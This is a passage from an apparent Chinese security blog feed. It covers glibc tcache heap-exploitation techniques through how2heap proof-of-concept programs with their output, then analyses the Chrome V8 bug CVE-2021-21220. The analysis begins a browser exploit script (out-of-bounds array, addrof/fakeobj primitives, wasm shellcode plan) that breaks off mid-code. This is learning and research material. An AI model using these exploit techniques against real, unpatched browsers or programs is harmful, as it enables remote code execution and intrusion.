<li><p>在 unsortedbin 中寻找 chunk 时，如果在 tcache 中放入 unsortedbin chunk 达到上限，则会直接返回最后一个 chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>但是默认情况下没有限制，这段代码也不会执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br></pre></td></tr></table></figure></li>
<li><p>在 unsortedbin 中寻找 chunk 时，如果之前曾放入过 tcache 块，则会取出一个并返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>tcache bins 中的 chunk 不会被合并，无论是相邻 chunk 还是 top chunk。</p>
<h2 id="tcache-thread-freeres"><a href="#tcache-thread-freeres" class="headerlink" title="tcache_thread_freeres"></a>tcache_thread_freeres</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __attribute__ ((section (<span class="string">&quot;__libc_thread_freeres_fn&quot;</span>)))</span><br><span class="line">tcache_thread_freeres (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  tcache = <span class="literal">NULL</span>;  <span class="comment">//tcache置空，使之后的free操作不会再把chunk放进tcache bins</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)  <span class="comment">//遍历tcache bins将这些chunk free掉</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">	&#123;</span><br><span class="line">	  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">	  tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">	  __libc_free (e);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);  <span class="comment">//free掉tcache_perthread_struct结构体</span></span><br><span class="line"></span><br><span class="line">  tcache_shutting_down = <span class="number">1</span>;  <span class="comment">//设置静态变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>tcache 分配和释放都只检查了 tcache 相关结构体的一些数据，没有前后检查等其他的检查，而且 tcache 相关代码比其他 bins 更优先，原先的很多检查机制都不会执行，所以 tcache 技术虽然提升了效率，但安全性却很差。</p>
<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代码嫖自how to heap</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(0x10): %p\n&quot;</span>, p1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(0x10): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x10</span>));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(0x10): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x10</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;a.out </span><br><span class="line">1st malloc(0x10): 0x559da9a7b260</span><br><span class="line">Freeing the first one</span><br><span class="line">Freeing the first one again</span><br><span class="line">2nd malloc(0x10): 0x559da9a7b260</span><br><span class="line">3rd malloc(0x10): 0x559da9a7b260</span><br></pre></td></tr></table></figure>

<p>tcache_dup 比 fastbin_dup 更简单，因为 tcache 没有连续两次 free 同一个指针的检查，就不用在中间 free 一个别的指针绕过，而且 tcache 不会与 top chunk 合并，还有 tcache 的范围比 fastbin 更大，会有更大的适用空间。glibc中依然可用，glibc2.31不可用。</p>
<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代码嫖自how to heap</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);  <span class="comment">// init heap</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We will overwrite a pointer to point to a fake &#x27;smallbin&#x27; region.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a, *b;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunk[<span class="number">64</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk:  %p\n&quot;</span>, &amp;fake_chunk[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0x110</span>;  <span class="comment">// the size</span></span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk+<span class="number">2</span>, <span class="number">0x41</span>, <span class="keyword">sizeof</span>(fake_chunk)<span class="number">-0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Overwritting our pointer with the address of the fake region inside the fake chunk, %p.\n&quot;</span>, &amp;fake_chunk[<span class="number">0</span>]);</span><br><span class="line">    a = &amp;fake_chunk[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunk[<span class="number">0</span>], &amp;fake_chunk[<span class="number">2</span>]);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk+<span class="number">2</span>, <span class="number">0x42</span>, <span class="keyword">sizeof</span>(fake_chunk)<span class="number">-0x10</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x100): %p\n&quot;</span>, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;a.out </span><br><span class="line">We will overwrite a pointer to point to a fake &#39;smallbin&#39; region.</span><br><span class="line">The chunk:  0x7ffe949cb950</span><br><span class="line">Overwritting our pointer with the address of the fake region inside the fake chunk, 0x7ffe949cb950.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next malloc will return the region of our fake chunk at 0x7ffe949cb950, which will be 0x7ffe949cb960!</span><br><span class="line">malloc(0x100): 0x7ffe949cb960</span><br></pre></td></tr></table></figure>



<p>tcache 释放 chunk 时没有对前后 chunk 进行检验，只需要释放的 chunk 对齐就能释放到 tcache bins 中，而且同样因为 tcach 的范围比 fastbin 大，适用范围扩大到包括 snallbin 的大小。此漏洞在glibc2.31中依然可以利用。</p>
<h2 id="tcache-overlapping-chunks"><a href="#tcache-overlapping-chunks" class="headerlink" title="tcache_overlapping_chunks"></a>tcache_overlapping_chunks</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代码嫖自how to heap</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">intptr_t</span> *p1, *p2, *p3;</span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x50</span> - <span class="number">8</span>);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x20</span> - <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(p1, <span class="number">0x41</span>, <span class="number">0x50</span><span class="number">-8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(p2, <span class="number">0x41</span>, <span class="number">0x30</span><span class="number">-8</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated victim chunk with requested size 0x48: %p\n&quot;</span>, p1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated sentry element after victim: %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> evil_chunk_size = <span class="number">0x110</span>;</span><br><span class="line">    <span class="keyword">int</span> evil_region_size = <span class="number">0x110</span> - <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Emulating corruption of the victim&#x27;s size to 0x110\n&quot;</span>);</span><br><span class="line">    *(p1<span class="number">-1</span>) = evil_chunk_size;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freed victim chunk to put it in a different tcache bin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">    p3 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line">    <span class="built_in">memset</span>(p3, <span class="number">0x42</span>, evil_region_size);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Requested a chunk of 0x100 bytes\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3: %p ~ %p\n&quot;</span>, p3, (<span class="keyword">char</span> *)p3+evil_region_size);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p2: %p ~ %p\n&quot;</span>, p2, (<span class="keyword">char</span> *)p2+<span class="number">0x20</span><span class="number">-8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;a.out </span><br><span class="line">Allocated victim chunk with requested size 0x48: 0x55c34c1c12a0</span><br><span class="line">Allocated sentry element after victim: 0x55c34c1c12f0</span><br><span class="line">Emulating corruption of the victim&#39;s size to 0x110</span><br><span class="line">Freed victim chunk to put it in a different tcache bin</span><br><span class="line">Requested a chunk of 0x100 bytes</span><br><span class="line">p3: 0x55c34c1c12a0 ~ 0x55c34c1c13a8</span><br><span class="line">p2: 0x55c34c1c12f0 ~ 0x55c34c1c1308</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>_int_free</code>中<code>tcache_put</code>之前没有对 chunk 进行前后检查，可以直接修改 size 再将其 free 放进修改后size对应的 tcache bin 中，malloc 时也可以直接将其返回，相当于可以随意修改 size 造成堆块重叠。glibc2.31中依然可用。</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">///代码嫖自how to heap</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">intptr_t</span> *p1, *p2, *p3;</span><br><span class="line">    <span class="keyword">size_t</span> target[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our target is a stack region at %p\n&quot;</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(p1, <span class="number">0x41</span>, <span class="number">0x30</span>+<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated victim chunk with requested size 0x30 at %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freed victim chunk to put it in a tcache bin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Emulating corruption of the next ptr\n&quot;</span>);</span><br><span class="line">    *p1 = (<span class="keyword">int64_t</span>)target;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we make two requests for the appropriate size so that malloc returns a chunk overlapping our target\n&quot;</span>);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(p2, <span class="number">0x42</span>, <span class="number">0x30</span>+<span class="number">8</span>);</span><br><span class="line">    p3 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(p3, <span class="number">0x42</span>, <span class="number">0x30</span>+<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The first malloc(0x30) returned %p, the second one: %p\n&quot;</span>, p2, p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;a.out </span><br><span class="line">Our target is a stack region at 0x7ffe4e15dfd0</span><br><span class="line">Allocated victim chunk with requested size 0x30 at 0x561c45845670</span><br><span class="line">Freed victim chunk to put it in a tcache bin</span><br><span class="line">Emulating corruption of the next ptr</span><br><span class="line">Now we make two requests for the appropriate size so that malloc returns a chunk overlapping our target</span><br><span class="line">The first malloc(0x30) returned 0x561c45845670, the second one: 0x7ffe4e15dfd0</span><br></pre></td></tr></table></figure>

<p>通过修改 tcache bin 中 chunk 的 fd 指针，使其指向任意位置，同时也就修改了 tcache_entry 的 next 指针，malloc 时将从此指针指向的地址返回 chunk，<code>__libc_malloc</code>中在<code>tcache_get</code>之前只检查了<code>tcache-&gt;entries[tc_idx] != NULL</code>，没有检查 count。</p>
<p>修改指针前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x55555555b670 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>count 为1，链表中也只有一个节点。</p>
<p>修改指针后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x55555555b670 —▸ 0x7fffffffdeb0 ◂— ...</span><br></pre></td></tr></table></figure>

<p>可以看到虽然 count 依然为1，但链表中已经加入了我们的 target。</p>
<p>第一次 malloc 后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  0]: 0x7fffffffdeb0 ◂— ...</span><br></pre></td></tr></table></figure>

<p>count 减为0，但此时链表中还有 target。</p>
<p>第二次 malloc 后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">tcachebins</span><br><span class="line">0x40 [ -1]: 0</span><br></pre></td></tr></table></figure>

<p>count 减成了-1，target 成功取出。</p>
<p>此漏洞在glibc2.27中依然可用，glibc2.31中已被修复，加入了对 count 的检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//glibc-2.31/malloc/malloc.c __libc_malloc()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-21220</title>
    <url>/2021/09/29/CVE-2021-21220/</url>
    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><p>漏洞存在于 Chrome 的 JS 引擎的 JIT 编译器 Turbofan 当中的 Instruction Selector阶段</p>
<ul>
<li>漏洞编号：CVE-2021-21220</li>
<li>漏洞类型：整数溢出</li>
<li>漏洞影响：远程代码执行</li>
<li>CVSS评分：8.8</li>
<li>利用难度：Medium</li>
<li>基础权限：不需要</li>
</ul>
<h3 id="2-组件概述"><a href="#2-组件概述" class="headerlink" title="2. 组件概述"></a>2. 组件概述</h3><p>TurboFan是 v8 的优化编译器，负责将字节码和一些分析数据作为输入并生成优化的机器代码。</p>
<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a>3. 漏洞利用</h3><ul>
<li>利用这个整数溢出漏洞构造一个长度为1但编译器认为其长度为0的数组</li>
<li>通过 Array.prototype.shift() 获得一个长度为0xffffffff的越界数组</li>
<li>通过越界数组构造任意地址读写原语</li>
<li>修改 wasm 代码执行 shellcode</li>
</ul>
<h3 id="4-漏洞影响"><a href="#4-漏洞影响" class="headerlink" title="4. 漏洞影响"></a>4. 漏洞影响</h3><p>V8 version &lt; 8.9.255.25</p>
<p>Chrome version &lt; 89.0.4389.128</p>
<h3 id="5-解决方案"><a href="#5-解决方案" class="headerlink" title="5. 解决方案"></a>5. 解决方案</h3><p><a href="https://chromium-review.googlesource.com/c/v8/v8/+/2822629/3/src/compiler/backend/x64/instruction-selector-x64.cc">https://chromium-review.googlesource.com/c/v8/v8/+/2822629/3/src/compiler/backend/x64/instruction-selector-x64.cc</a></p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
<li>靶机环境版本详述：Win10 1909</li>
<li>靶机配置：Chromium version = 89.0.4389.0  关闭沙箱</li>
<li>攻击机环境版本详述：kali 5.8.0</li>
<li>攻击机配置：Python 3.8.6(开web服务)</li>
</ul>
<h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2. 复现过程"></a>2. 复现过程</h3><ol>
<li><p>攻击机编写 exploit 开启服务等待访问</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//exploit.js</span></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>])</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Module(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="keyword">let</span> buf2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x150</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">	<span class="keyword">return</span> u64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">	u64_buf[<span class="number">0</span>] = val;</span><br><span class="line">	<span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);</span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(x == <span class="number">-1</span>) x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);</span><br><span class="line">	arr.shift();</span><br><span class="line">	<span class="keyword">var</span> cor = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">	<span class="keyword">return</span> [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">0x3000</span>; ++i)</span><br><span class="line">    foo();</span><br><span class="line"></span><br><span class="line">[arr, cor] = foo();</span><br><span class="line"></span><br><span class="line">arr[<span class="number">16</span>] = <span class="number">0x4242</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    arr[<span class="number">7</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> ftoi(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    cor[<span class="number">0</span>] = itof(k);</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_map = ftoi(cor[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr2 = [itof(float_array_map), <span class="number">1.2</span>, <span class="number">2.3</span>, <span class="number">3.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake = fakeobj(addrof(arr2) + <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span 